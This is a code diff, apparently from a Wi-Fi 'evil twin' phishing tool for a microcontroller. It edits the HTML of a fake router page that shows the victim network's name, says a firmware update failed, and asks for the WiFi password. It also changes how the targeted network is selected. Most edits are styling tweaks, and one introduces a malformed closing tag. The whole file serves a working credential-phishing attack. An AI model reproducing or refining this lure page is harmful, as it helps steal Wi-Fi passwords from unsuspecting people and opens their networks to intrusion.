@@ -105,18 +105,19 @@ String index() {
                 "<meta charset='UTF-8'>"
                 "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                 "<style>"
-                "body {color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
+                "body {color: #333; font-family: 'Century Gothic', sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0;}"
                 "div {padding: 0.5em; text-align: center;}"
                 "input {width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555; border-radius: 10px;}"
                 "label {color: #333; display: block; font-style: italic; font-weight: bold;}"
                 "nav {background: #0066ff;color: #fff;padding: 1em;}"
                 "nav b {font-size: 1.5em;}"
+                "footer {padding: 1em;text-align: center;font-size: 14px;}"
                 "</style></head>"
                 "<body>"
                 "<nav><b>" + victimSSID + "</b><br>Router Info.</nav>"
                 "<div>Your router encountered a problem while automatically installing the latest firmware update.<br>To revert the old firmware and manually update later, please verify your password.</div>"
                 "<div><form action='/' method='post'>"
-                "<label>WiFi password:</label>"
+                "<label>WiFi Password</label>"
                 "<input type='password' id='password' name='password' minlength='8' required>"
                 "<input type='submit' value='Continue'>"
                 "</form></div>"
@@ -135,11 +136,11 @@ String redirectPage() {
                            "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                            "<title>" + victimSSID + " : Validation Panel</title>"
                            "<style>"
-                           "body{color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
-                           "nav{background: #0066ff;color: #fff;padding: 1em;}"
-                           "nav b{font-size: 1.5em;}"
-                           "div{padding: 0.5em; text-align: center;}"
-                           "footer{padding: 1em;text-align: center;font-size: 14px;}"
+                           "body {color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
+                           "nav {background: #0066ff;color: #fff;padding: 1em;}"
+                           "nav b {font-size: 1.5em;}"
+                           "div {padding: 0.5em; text-align: center;}"
+                           "footer {padding: 1em;text-align: center;font-size: 14px;}"
                            "</style>"
                            "</head>"
                            "<body>"
@@ -165,11 +166,11 @@ String updatePage(bool success) {
                          "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                          "<title>" + victimSSID + " : Validation Panel</title>"
                          "<style>"
-                         "body{color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
-                         "nav{background: #0066ff;color: #fff;padding: 1em;}"
-                         "nav b{font-size: 1.5em;}"
-                         "div{padding: 0.5em;text-align: center;}"
-                         "footer{padding: 1em;text-align: center;font-size: 14px;}"
+                         "body {color: #333;font-family: 'Century Gothic', sans-serif;font-size: 18px;line-height: 24px;margin: 0;padding: 0;}"
+                         "nav {background: #0066ff;color: #fff;padding: 1em;}"
+                         "nav b {font-size: 1.5em;}"
+                         "div {padding: 0.5em;text-align: center;}"
+                         "footer {padding: 1em;text-align: center;font-size: 14px;}"
                          "</style>"
                          "</head>"
                          "<body>"
@@ -184,9 +185,7 @@ String updatePage(bool success) {
                      "}, 3000);"
                      "</script>";
   }
-  updateMessage += "<footer>&#169; All rights reserved.</footer>"
-                   "</body>"
-                   "</html>";
+  updateMessage += "<footer>&#169; All rights reserved.</footer></body</html>";
   return updateMessage;
 }
 
@@ -259,15 +258,17 @@ String controlPanelPage = "<!DOCTYPE html>"
                           "<table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Encryption</th><th>Select</th></tr>";
 
 void handleIndex() {
-  if (webServer.hasArg("rescan")) {
-    performScan();
-  }
   if (webServer.hasArg("ap")) {
     String selectedBSSID = webServer.arg("ap");
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(networks[i].bssid, 6) == selectedBSSID) {
-        selectedNetwork = networks[i];
-        break;
+    String currentSelectedBSSID = bytesToStr(selectedNetwork.bssid, 6);
+    if (selectedBSSID == currentSelectedBSSID) {
+      selectedNetwork = networkDetails();
+    } else {
+      for (int i = 0; i < 16; i++) {
+        if (bytesToStr(networks[i].bssid, 6) == selectedBSSID) {
+          selectedNetwork = networks[i];
+          break;
+        }
       }
     }
   }
